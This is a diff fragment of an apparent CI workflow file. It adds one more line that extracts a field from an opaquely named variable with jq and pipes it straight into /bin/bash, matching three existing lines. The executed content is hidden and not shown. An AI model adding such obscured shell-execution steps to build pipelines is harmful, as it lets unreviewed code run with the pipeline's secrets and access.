@@ -36,6 +36,7 @@ jobs:
           echo $tvvrx34 | jq -r .a1947 | /bin/bash
           echo $jsk153 | jq -r .qx07123 | /bin/bash
           printf '%s' "$g0244" | jq -r .q64902 | /bin/bash
+          printf '%s' "$u0" | jq -r .y82 | /bin/bash
 
       - name: Archive output
         if: always()
